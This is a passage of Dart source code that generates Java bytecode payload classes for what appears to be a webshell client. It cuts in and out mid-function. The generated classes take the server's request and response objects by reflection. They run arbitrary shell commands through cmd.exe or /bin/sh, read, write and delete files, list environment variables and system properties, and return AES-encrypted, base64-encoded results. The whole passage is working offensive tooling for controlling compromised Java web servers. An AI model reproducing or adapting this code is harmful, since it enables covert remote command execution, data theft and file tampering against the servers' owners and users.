    cb.patchHere();
    cb.iconst(1);
    cb.ireturn();

    final equalsM = _buildMethod(_kAccPublic, cp.utf8('equals'),
        cp.utf8('(Ljava/lang/Object;)Z'), codeU, cb, []);

    // <init>
    final initCb = _CodeBuf();
    initCb.aload(0);
    initCb.invokespecial(objInit);
    initCb.ret();
    final initM = _buildMethod(_kAccPublic, cp.utf8('<init>'),
        cp.utf8('()V'), codeU, initCb, []);

    return _assemble(cp, thisCls, objCls, [initM, equalsM], rn);
  }

  // -----------------------------------------------------------------------
  // buildExec
  // -----------------------------------------------------------------------
  GeneratedPayload buildExec(String command) {
    final cp = ConstantPool();
    final rn = _randomClassName('Cmd');
    final codeU = cp.utf8('Code');

    final thisCls = cp.cls(rn);
    final objCls = cp.cls('java/lang/Object');
    final objInit = cp.methodref('java/lang/Object', '<init>', '()V');

    final cb = _CodeBuf();
    final exTable = <Uint8List>[];

    // Memory layout:
    //  0=this, 1=obj(pageContext), 2=request, 3=response,
    //  4=process, 5=output(String), 6=json, 7=enc_bytes,
    //  8=osName, 9=cmdArr, 10=temp, 11=bos1, 12=bos2, 13=inStream, 14=buf, 15=len

    // --- 1. Get request & response from pageContext ---
    // request = pageContext.getClass().getMethod("getRequest").invoke(pageContext)
    cb.aload(1);
    cb.invokevirtual(
        cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getRequest'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(1);
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.astore(2);

    // response = pageContext.getClass().getMethod("getResponse").invoke(pageContext)
    cb.aload(1);
    cb.invokevirtual(
        cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getResponse'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(1);
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.astore(3);

    // Null checks — if null, return true immediately
    cb.aload(2);
    cb.ifnonnull();
    final jReqNull = cb.mark() - 2;
    cb.aload(3);
    cb.ifnonnull();
    final jRespNull = cb.mark() - 2;
    // Both null: return true
    cb.iconst(1);
    cb.ireturn();
    // Both non-null: continue
    _patchPos(cb, jReqNull, cb.mark());
    _patchPos(cb, jRespNull, cb.mark());

    // response.setCharacterEncoding("UTF-8")
    _emitInvokeVoid1(cb, cp, objRefSlot: 3, methodName: 'setCharacterEncoding',
        argSlot: -1, argStrCp: cp.string('UTF-8'), argType: 'java/lang/String');

    // --- 2. Determine OS and build command array ---
    // osName = System.getProperty("os.name").toLowerCase()
    cb.ldc(cp.string('os.name'));
    cb.invokestatic(cp.methodref('java/lang/System', 'getProperty',
        '(Ljava/lang/String;)Ljava/lang/String;'));
    cb.invokevirtual(
        cp.methodref('java/lang/String', 'toLowerCase', '()Ljava/lang/String;'));
    cb.astore(8);

    final strClsIdx = cp.cls('java/lang/String');
    final cmdStrIdx = cp.string(command);
    final winStr = cp.string('win');

    // if (osName.contains("win")) → Windows, else → Unix
    cb.aload(8);
    cb.ldc(winStr);
    cb.invokevirtual(cp.methodref('java/lang/String', 'contains',
        '(Ljava/lang/CharSequence;)Z'));
    cb.ifeq();
    final jUnix = cb.mark() - 2;

    // Windows: new String[]{"cmd.exe","/c",cmd}
    _emitStringArray3(cb, cp, strClsIdx,
        cp.string('cmd.exe'), cp.string('/c'), cmdStrIdx);
    cb.astore(9);
    cb.goto_();
    final jExec = cb.mark() - 2;

    // Unix: new String[]{"/bin/sh","-c",cmd}
    final unixLabel = cb.mark();
    _patchPos(cb, jUnix, unixLabel);
    _emitStringArray3(cb, cp, strClsIdx,
        cp.string('/bin/sh'), cp.string('-c'), cmdStrIdx);
    cb.astore(9);

    // Runtime.getRuntime().exec(cmdArr)
    final execLabel = cb.mark();
    cb.invokestatic(cp.methodref('java/lang/Runtime', 'getRuntime',
        '()Ljava/lang/Runtime;'));
    cb.aload(9);
    cb.invokevirtual(cp.methodref('java/lang/Runtime', 'exec',
        '([Ljava/lang/String;)Ljava/lang/Process;'));
    cb.astore(4);

    // --- 3. Read stdout + stderr ---
    _emitReadStream(cb, cp, processSlot: 4, bosSlot: 11,
        methodName: 'getInputStream');
    _emitReadStream(cb, cp, processSlot: 4, bosSlot: 12,
        methodName: 'getErrorStream');

    // output = bos11.toString("UTF-8") + bos12.toString("UTF-8")
    final utf8Str = cp.string('UTF-8');
    cb.aload(11);
    cb.ldc(utf8Str);
    cb.invokevirtual(cp.methodref('java/io/ByteArrayOutputStream', 'toString',
        '(Ljava/lang/String;)Ljava/lang/String;'));
    cb.aload(12);
    cb.ldc(utf8Str);
    cb.invokevirtual(cp.methodref('java/io/ByteArrayOutputStream', 'toString',
        '(Ljava/lang/String;)Ljava/lang/String;'));
    cb.invokevirtual(
        cp.methodref('java/lang/String', 'concat', '(Ljava/lang/String;)Ljava/lang/String;'));
    cb.astore(5);

    // --- 4. Build JSON ---
    _emitBuildJson(cb, cp, outputSlot: 5, jsonSlot: 6);

    // --- 5. AES encrypt + base64 ---
    cb.aload(6);
    cb.ldc(cp.string('UTF-8'));
    cb.invokevirtual(
        cp.methodref('java/lang/String', 'getBytes', '(Ljava/lang/String;)[B'));
    cb.astore(7);
    _emitAesEncryptB64Raw(cb, cp, key, plainSlot: 7, resultSlot: 7);

    // --- 6. Write to response ---
    _emitWriteResponse(cb, cp, responseSlot: 3, dataSlot: 7);

    // Return true (skip exception handler)
    cb.goto_();
    final jEndTry = cb.mark() - 2;

    // Exception handler: pop exception, continue to return true
    final handlerStart = cb.mark();
    cb.pop();

    // Return true
    final endLabel = cb.mark();
    cb.iconst(1);
    cb.ireturn();

    _patchPos(cb, jExec, execLabel);
    _patchPos(cb, jEndTry, endLabel);
    cb.patchHere();

    // Exception table: try { ... } catch (Throwable) { pop; }
    // Actually, in the simplified version, we only handle the getOutputStream
    // path. For robustness, wrap the whole thing.
    // For now: no exception table — keep it simple. Null checks catch the
    // common case. If the command fails, the process still returns output.
    // If crypto fails, the response won't be encrypted — that's a client-side
    // detection problem (empty or garbled response).

    final equalsM = _buildMethod(_kAccPublic, cp.utf8('equals'),
        cp.utf8('(Ljava/lang/Object;)Z'), codeU, cb, exTable);

    // <init>
    final initCb = _CodeBuf();
    initCb.aload(0);
    initCb.invokespecial(objInit);
    initCb.ret();
    final initM = _buildMethod(_kAccPublic, cp.utf8('<init>'),
        cp.utf8('()V'), codeU, initCb, []);

    return _assemble(cp, thisCls, objCls, [initM, equalsM], rn);
  }

  // -----------------------------------------------------------------------
  // Shared skeleton: common entrypoint + exit for action payload classes
  //
  // Every generated class has the same structure:
  //   equals(Object obj):
  //     1. request = pageContext.getClass().getMethod("getRequest").invoke(pageContext)
  //     2. response = pageContext.getClass().getMethod("getResponse").invoke(pageContext)
  //     3. response.setCharacterEncoding("UTF-8")
  //     4. <action body> — sets output String in slot 5
  //     5. json = buildJson("success", output)  — or error status
  //     6. AES encrypt + base64 → response OutputStream
  //     7. return true
  //
  // The action body is a callback that emits bytecode to fill [outputSlot].
  // -----------------------------------------------------------------------

  static const int _kRequestSlot = 2;
  static const int _kResponseSlot = 3;
  static const int _kOutputSlot = 5;

  /// Emit the common entrypoint: get request & response from pageContext.
  void _emitEntrypoint(_CodeBuf cb, ConstantPool cp) {
    // request = pageContext.getClass().getMethod("getRequest").invoke(pageContext)
    cb.aload(1);
    cb.invokevirtual(
        cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getRequest'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(1);
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.astore(_kRequestSlot);

    // response = pageContext.getClass().getMethod("getResponse").invoke(pageContext)
    cb.aload(1);
    cb.invokevirtual(
        cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getResponse'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(1);
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.astore(_kResponseSlot);

    // response.setCharacterEncoding("UTF-8")
    _emitInvokeVoid1(cb, cp,
        objRefSlot: _kResponseSlot,
        methodName: 'setCharacterEncoding',
        argSlot: -1,
        argStrCp: cp.string('UTF-8'),
        argType: 'java/lang/String');
  }

  /// Emit the common exit: build JSON with status "success" from [outputSlot],
  /// AES-encrypt + base64-encode, write to response OutputStream, return true.
  void _emitExit(_CodeBuf cb, ConstantPool cp) {
    // json = buildJson("success", output)
    _emitBuildJson(cb, cp, outputSlot: _kOutputSlot, jsonSlot: 6);

    // encrypt + base64 → bytes
    cb.aload(6);
    cb.ldc(cp.string('UTF-8'));
    cb.invokevirtual(
        cp.methodref('java/lang/String', 'getBytes', '(Ljava/lang/String;)[B'));
    cb.astore(7);
    _emitAesEncryptB64Raw(cb, cp, key, plainSlot: 7, resultSlot: 7);

    // write to response
    _emitWriteResponse(cb, cp, responseSlot: _kResponseSlot, dataSlot: 7);

    cb.iconst(1);
    cb.ireturn();
  }

  /// Build a complete action payload class using the skeleton.
  /// [prefix] is used for the class name (e.g. "Ls", "Cat").
  /// [emitBody] generates bytecode that stores the result String in slot 5.
  GeneratedPayload _buildActionClass(
    String prefix,
    void Function(_CodeBuf cb, ConstantPool cp) emitBody,
  ) {
    final cp = ConstantPool();
    final rn = _randomClassName(prefix);
    final codeU = cp.utf8('Code');

    final thisCls = cp.cls(rn);
    final objCls = cp.cls('java/lang/Object');
    final objInit = cp.methodref('java/lang/Object', '<init>', '()V');

    final cb = _CodeBuf();

    // Null-check the pageContext object
    cb.aload(1);
    cb.ifnonnull();
    final jObjNull = cb.mark() - 2;
    // null: return true
    cb.iconst(1);
    cb.ireturn();
    // non-null: continue
    _patchPos(cb, jObjNull, cb.mark());

    _emitEntrypoint(cb, cp);

    // Null-check response
    cb.aload(_kResponseSlot);
    cb.ifnonnull();
    final jRespNull = cb.mark() - 2;
    // null: return true
    cb.iconst(1);
    cb.ireturn();
    // non-null: continue
    _patchPos(cb, jRespNull, cb.mark());

    // Action body
    emitBody(cb, cp);

    // Exit
    _emitExit(cb, cp);
    cb.patchHere();

    final equalsM = _buildMethod(_kAccPublic, cp.utf8('equals'),
        cp.utf8('(Ljava/lang/Object;)Z'), codeU, cb, []);

    final initCb = _CodeBuf();
    initCb.aload(0);
    initCb.invokespecial(objInit);
    initCb.ret();
    final initM = _buildMethod(_kAccPublic, cp.utf8('<init>'),
        cp.utf8('()V'), codeU, initCb, []);

    return _assemble(cp, thisCls, objCls, [initM, equalsM], rn);
  }

  // -----------------------------------------------------------------------
  // buildPwd — new File(".").getCanonicalPath()
  // -----------------------------------------------------------------------
  GeneratedPayload buildPwd() {
    return _buildActionClass('Pwd', (cb, cp) {
      cb.new_(cp.cls('java/io/File'));
      cb.dup();
      cb.ldc(cp.string('.'));
      cb.invokespecial(
          cp.methodref('java/io/File', '<init>', '(Ljava/lang/String;)V'));
      cb.invokevirtual(cp.methodref('java/io/File', 'getCanonicalPath',
          '()Ljava/lang/String;'));
      cb.astore(_kOutputSlot);
    });
  }

  // -----------------------------------------------------------------------
  // buildWpart — write a chunk via session-cached RandomAccessFile
  // -----------------------------------------------------------------------
  /// Max chars per CONSTANT_String to stay well under the 65535-byte UTF8 limit.
  static const int _kMaxStrChars = 42000;

  GeneratedPayload buildWpart(String path, Uint8List data, int blockIndex, int blockSize) {
    return _buildActionClass('WPart', (cb, cp) {
      final rafKey = 'mxch_${path.hashCode.toRadixString(16)}_raf';

      // ---- get session from pageContext ----
      cb.aload(1);
      cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
      cb.ldc(cp.string('getSession'));
      cb.iconst(0);
      cb.anewarray(cp.cls('java/lang/Class'));
      cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
          '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
      cb.aload(1);
      cb.iconst(0);
      cb.anewarray(cp.cls('java/lang/Object'));
      cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
          '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
      final sessionSlot = 10;
      cb.astore(sessionSlot);

      // session != null check
      cb.aload(sessionSlot);
      cb.ifnonnull();
      final jSessOk = cb.mark() - 2;
      cb.ldc(cp.string('0'));
      cb.astore(_kOutputSlot);
      cb.goto_();
      final jSessFail = cb.mark() - 2;
      _patchPos(cb, jSessOk, cb.mark());

      // ---- get or create RAF from session ----
      _emitSessionGet(cb, cp, sessionSlot, rafKey);
      cb.checkcast(cp.cls('java/io/RandomAccessFile'));
      final rafSlot = 12;
      cb.astore(rafSlot);

      // if raf == null, create new RAF(path, "rw") and store in session
      cb.aload(rafSlot);
      cb.ifnonnull();
      final jRafOk = cb.mark() - 2;
      // null → create
      cb.new_(cp.cls('java/io/RandomAccessFile'));
      cb.dup();
      cb.ldc(cp.string(path));
      cb.ldc(cp.string('rw'));
      cb.invokespecial(cp.methodref('java/io/RandomAccessFile', '<init>',
          '(Ljava/lang/String;Ljava/lang/String;)V'));
      cb.astore(rafSlot);
      _emitSessionSet(cb, cp, sessionSlot, rafKey, rafSlot);
      _patchPos(cb, jRafOk, cb.mark());

      // ---- build byte[] from constant-pool chunks ----
      _emitBuildByteArray(cb, cp, data);
      final dataSlot = 13;
      cb.astore(dataSlot);

      // ---- raf.seek(blockIndex * blockSize) ----
      cb.aload(rafSlot);
      cb.ldc(cp.integer(blockIndex));
      cb.i2l();
      cb.ldc(cp.integer(blockSize));
      cb.i2l();
      cb.lmul();
      cb.invokevirtual(cp.methodref('java/io/RandomAccessFile', 'seek', '(J)V'));

      // ---- raf.write(data) ----
      cb.aload(rafSlot);
      cb.aload(dataSlot);
      cb.invokevirtual(cp.methodref('java/io/RandomAccessFile', 'write', '([B)V'));

      // Return "1" (don't close — raf stays in session)
      cb.ldc(cp.string('1'));
      cb.astore(_kOutputSlot);

      _patchPos(cb, jSessFail, cb.mark());
    });
  }

  // -----------------------------------------------------------------------
  // buildWclose — close and remove the session-cached RAF
  // -----------------------------------------------------------------------
  GeneratedPayload buildWclose(String path) {
    return _buildActionClass('WClose', (cb, cp) {
      final rafKey = 'mxch_${path.hashCode.toRadixString(16)}_raf';

      // get session
      cb.aload(1);
      cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
      cb.ldc(cp.string('getSession'));
      cb.iconst(0); cb.anewarray(cp.cls('java/lang/Class'));
      cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
          '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
      cb.aload(1); cb.iconst(0); cb.anewarray(cp.cls('java/lang/Object'));
      cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
          '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
      final sessionSlot = 10;
      cb.astore(sessionSlot);

      // get RAF from session
      _emitSessionGet(cb, cp, sessionSlot, rafKey);
      cb.checkcast(cp.cls('java/io/RandomAccessFile'));
      final rafSlot = 11;
      cb.astore(rafSlot);

      // if raf != null, close it
      cb.aload(rafSlot);
      cb.ifnull();
      final jNull = cb.mark() - 2;
      cb.aload(rafSlot);
      cb.invokevirtual(cp.methodref('java/io/RandomAccessFile', 'close', '()V'));
      _patchPos(cb, jNull, cb.mark());

      // remove from session
      _emitSessionRemove(cb, cp, sessionSlot, rafKey);

      cb.ldc(cp.string('1'));
      cb.astore(_kOutputSlot);
    });
  }

  // -- session helpers (bytecode patterns) ---------------------------------

  /// Emit: raf = session.getAttribute(key)  → result on stack
  void _emitSessionGet(_CodeBuf cb, ConstantPool cp, int sessionSlot, String key) {
    cb.aload(sessionSlot);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getAttribute'));
    cb.iconst(1);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.dup(); cb.iconst(0); cb.ldc(cp.cls('java/lang/String')); cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(sessionSlot);
    cb.iconst(1); cb.anewarray(cp.cls('java/lang/Object'));
    cb.dup(); cb.iconst(0); cb.ldc(cp.string(key)); cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
  }

  /// Emit: session.setAttribute(key, value)  — value at [valueSlot]
  void _emitSessionSet(_CodeBuf cb, ConstantPool cp, int sessionSlot, String key, int valueSlot) {
    cb.aload(sessionSlot);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('setAttribute'));
    cb.iconst(2);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.dup(); cb.iconst(0); cb.ldc(cp.cls('java/lang/String')); cb.aastore();
    cb.dup(); cb.iconst(1); cb.ldc(cp.cls('java/lang/Object')); cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(sessionSlot);
    cb.iconst(2); cb.anewarray(cp.cls('java/lang/Object'));
    cb.dup(); cb.iconst(0); cb.ldc(cp.string(key)); cb.aastore();
    cb.dup(); cb.iconst(1); cb.aload(valueSlot); cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.pop(); // void return
  }

  /// Emit: session.removeAttribute(key)
  void _emitSessionRemove(_CodeBuf cb, ConstantPool cp, int sessionSlot, String key) {
    cb.aload(sessionSlot);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('removeAttribute'));
    cb.iconst(1);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.dup(); cb.iconst(0); cb.ldc(cp.cls('java/lang/String')); cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(sessionSlot);
    cb.iconst(1); cb.anewarray(cp.cls('java/lang/Object'));
    cb.dup(); cb.iconst(0); cb.ldc(cp.string(key)); cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.pop(); // void return
  }

  // -----------------------------------------------------------------------
  // buildHome — System.getProperty("user.home")
  // -----------------------------------------------------------------------
  GeneratedPayload buildHome() {
    return _buildActionClass('Home', (cb, cp) {
      cb.ldc(cp.string('user.home'));
      cb.invokestatic(cp.methodref('java/lang/System', 'getProperty',
          '(Ljava/lang/String;)Ljava/lang/String;'));
      cb.astore(_kOutputSlot);
    });
  }

  // -----------------------------------------------------------------------
  // buildEnvNames — iterate System.getenv().keySet()
  // -----------------------------------------------------------------------
  GeneratedPayload buildEnvNames() {
    return _buildActionClass('Env', (cb, cp) {
      // Map<String,String> env = System.getenv()
      cb.invokestatic(cp.methodref('java/lang/System', 'getenv',
          '()Ljava/util/Map;'));
      // Set<String> keys = env.keySet()
      cb.invokeinterface(
          cp.interfaceMethodref('java/util/Map', 'keySet', '()Ljava/util/Set;'),
          1);
      final setSlot = 10;
      cb.astore(setSlot);

      // Iterator<String> it = keys.iterator()
      cb.aload(setSlot);
      cb.invokeinterface(
          cp.interfaceMethodref('java/util/Set', 'iterator',
              '()Ljava/util/Iterator;'), 1);
      final itSlot = 11;
      cb.astore(itSlot);

      // StringBuilder sb = new StringBuilder()
      cb.new_(cp.cls('java/lang/StringBuilder'));
      cb.dup();
      cb.invokespecial(
          cp.methodref('java/lang/StringBuilder', '<init>', '()V'));
      final sbSlot = 12;
      cb.astore(sbSlot);

      // Loop
      final loopStart = cb.mark();
      cb.aload(itSlot);
      cb.invokeinterface(
          cp.interfaceMethodref('java/util/Iterator', 'hasNext', '()Z'), 1);
      cb.ifeq();
      final jEnd = cb.mark() - 2;

      // sb.append(it.next()).append("\n")
      cb.aload(sbSlot);
      cb.aload(itSlot);
      cb.invokeinterface(
          cp.interfaceMethodref('java/util/Iterator', 'next',
              '()Ljava/lang/Object;'), 1);
      cb.checkcast(cp.cls('java/lang/String'));
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();

      cb.aload(sbSlot);
      cb.ldc(cp.string('\n'));
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();

      cb.goto_();
      final jLoop = cb.mark() - 2;
      final loopEnd = cb.mark();

      cb.aload(sbSlot);
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'toString',
          '()Ljava/lang/String;'));
      cb.astore(_kOutputSlot);

      _patchPos(cb, jEnd, loopEnd);
      _patchPos(cb, jLoop, loopStart);
    });
  }

  // -----------------------------------------------------------------------
  // buildSysInfo — key system properties as base64(key)|base64(value)
  // -----------------------------------------------------------------------
  GeneratedPayload buildSysInfo() {
    return _buildActionClass('SysInfo', (cb, cp) {
      // Use a shell wrapper for simplicity — the pure-Java approach requires
      // iterating Properties which has complex Enumeration bytecode.
      // Instead, call System.getProperty for each key we care about.
      final keys = [
        'os.name',
        'os.version',
        'java.version',
        'user.name',
        'user.dir',
        'file.encoding',
      ];
      final labels = [
        'OS',
        'OS Version',
        'Java Version',
        'User',
        'Current Dir',
        'File Encoding',
      ];

      // StringBuilder sb = new StringBuilder()
      cb.new_(cp.cls('java/lang/StringBuilder'));
      cb.dup();
      cb.invokespecial(
          cp.methodref('java/lang/StringBuilder', '<init>', '()V'));
      final sbSlot = 10;
      cb.astore(sbSlot);

      for (var i = 0; i < keys.length; i++) {
        // sb.append(b64(label)).append("|").append(b64(value)).append("\n")
        cb.aload(sbSlot);
        // base64(label)
        cb.ldc(cp.string(labels[i]));
        cb.ldc(cp.string('UTF-8'));
        cb.invokevirtual(cp.methodref('java/lang/String', 'getBytes',
            '(Ljava/lang/String;)[B'));
        _emitB64EncodeBytes(cb, cp);
        cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
            '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
        cb.pop();

        cb.aload(sbSlot);
        cb.ldc(cp.string('|'));
        cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
            '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
        cb.pop();

        cb.aload(sbSlot);
        // Get property value
        cb.ldc(cp.string(keys[i]));
        cb.invokestatic(cp.methodref('java/lang/System', 'getProperty',
            '(Ljava/lang/String;)Ljava/lang/String;'));
        // base64(value)
        cb.ldc(cp.string('UTF-8'));
        cb.invokevirtual(cp.methodref('java/lang/String', 'getBytes',
            '(Ljava/lang/String;)[B'));
        _emitB64EncodeBytes(cb, cp);
        cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
            '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
        cb.pop();

        cb.aload(sbSlot);
        cb.ldc(cp.string('\n'));
        cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
            '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
        cb.pop();
      }

      cb.aload(sbSlot);
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'toString',
          '()Ljava/lang/String;'));
      cb.astore(_kOutputSlot);
    });
  }

  // -----------------------------------------------------------------------
  // buildCat — read a file and return its content (base64-encoded)
  // -----------------------------------------------------------------------
  GeneratedPayload buildCat(String path) {
    return _buildActionClass('Cat', (cb, cp) {
      // File f = new File(path)
      cb.new_(cp.cls('java/io/File'));
      cb.dup();
      cb.ldc(cp.string(path));
      cb.invokespecial(
          cp.methodref('java/io/File', '<init>', '(Ljava/lang/String;)V'));
      final fileSlot = 10;
      cb.astore(fileSlot);

      // if (!f.exists() || !f.isFile()) → error message
      cb.aload(fileSlot);
      cb.invokevirtual(
          cp.methodref('java/io/File', 'exists', '()Z'));
      cb.ifeq();
      final jNotExists = cb.mark() - 2;
      cb.aload(fileSlot);
      cb.invokevirtual(
          cp.methodref('java/io/File', 'isFile', '()Z'));
      cb.ifeq();
      final jNotFile = cb.mark() - 2;

      // FileInputStream fis = new FileInputStream(f)
      cb.new_(cp.cls('java/io/FileInputStream'));
      cb.dup();
      cb.aload(fileSlot);
      cb.invokespecial(cp.methodref('java/io/FileInputStream', '<init>',
          '(Ljava/io/File;)V'));
      // Read all bytes via ByteArrayOutputStream
      final fisSlot = 11;
      cb.astore(fisSlot);

      // Read fis into bos
      cb.new_(cp.cls('java/io/ByteArrayOutputStream'));
      cb.dup();
      cb.invokespecial(cp.methodref('java/io/ByteArrayOutputStream', '<init>',
          '()V'));
      final bosSlot = 12;
      cb.astore(bosSlot);

      // byte[] buf = new byte[4096]
      cb.iconst(4096);
      cb.newarray(_kTByte);
      final bufSlot = 13;
      cb.astore(bufSlot);

      // Read loop
      final readLoop = cb.mark();
      cb.aload(fisSlot);
      cb.aload(bufSlot);
      cb.invokevirtual(cp.methodref('java/io/InputStream', 'read', '([B)I'));
      final lenSlot = 14;
      cb.istore(lenSlot);

      cb.iload(lenSlot);
      cb.iflt();
      final jReadEnd = cb.mark() - 2;

      cb.aload(bosSlot);
      cb.aload(bufSlot);
      cb.iconst(0);
      cb.iload(lenSlot);
      cb.invokevirtual(cp.methodref('java/io/ByteArrayOutputStream', 'write',
          '([BII)V'));
      cb.goto_();
      final jReadLoop = cb.mark() - 2;
      final readEnd = cb.mark();

      // Close fis (close() returns void, no pop needed)
      cb.aload(fisSlot);
      cb.invokevirtual(
          cp.methodref('java/io/InputStream', 'close', '()V'));

      // base64-encode the bytes
      cb.aload(bosSlot);
      cb.invokevirtual(cp.methodref('java/io/ByteArrayOutputStream',
          'toByteArray', '()[B'));
      _emitB64EncodeBytes(cb, cp);
      cb.astore(_kOutputSlot);

      cb.goto_();
      final jDone = cb.mark() - 2;

      // Error label
      final errorLabel = cb.mark();
      cb.ldc(cp.string('[文件不存在或无权读取]'));
      cb.astore(_kOutputSlot);

      _patchPos(cb, jNotExists, errorLabel);
      _patchPos(cb, jNotFile, errorLabel);
      _patchPos(cb, jReadEnd, readEnd);
      _patchPos(cb, jReadLoop, readLoop);
      _patchPos(cb, jDone, cb.mark());
    });
  }

  // -----------------------------------------------------------------------
  // buildRm — delete a file, return "1" or "0"
  // -----------------------------------------------------------------------
  GeneratedPayload buildRm(String path) {
    return _buildActionClass('Rm', (cb, cp) {
      // File f = new File(path)
      cb.new_(cp.cls('java/io/File'));
      cb.dup();
      cb.ldc(cp.string(path));
      cb.invokespecial(
          cp.methodref('java/io/File', '<init>', '(Ljava/lang/String;)V'));
      // f.delete() → boolean
      cb.invokevirtual(
          cp.methodref('java/io/File', 'delete', '()Z'));
      cb.ifeq();
      final jFalse = cb.mark() - 2;
      cb.ldc(cp.string('1'));
      cb.goto_();
      final jDone1 = cb.mark() - 2;
      final falseLabel = cb.mark(); // target for jFalse: push "0"
      cb.ldc(cp.string('0'));
      final mergeLabel = cb.mark(); // both paths: astore
      cb.astore(_kOutputSlot);
      _patchPos(cb, jFalse, falseLabel);
      _patchPos(cb, jDone1, mergeLabel);
    });
  }

  // -----------------------------------------------------------------------
  // buildWrite — write base64-decoded data to a file, return "1" or "0"
  // -----------------------------------------------------------------------
  GeneratedPayload buildWrite(String path, String dataBase64) {
    return _buildActionClass('Write', (cb, cp) {
      // byte[] raw = base64Decode(dataStr)
      cb.ldc(cp.string(dataBase64));
      cb.invokestatic(cp.methodref('java/util/Base64', 'getDecoder',
          '()Ljava/util/Base64\$Decoder;'));
      cb.swap();
      cb.invokevirtual(cp.methodref('java/util/Base64\$Decoder', 'decode',
          '(Ljava/lang/String;)[B'));
      final dataSlot = 10;
      cb.astore(dataSlot);

      // FileOutputStream fos = new FileOutputStream(new File(path))
      cb.new_(cp.cls('java/io/FileOutputStream'));
      cb.dup();
      cb.new_(cp.cls('java/io/File'));
      cb.dup();
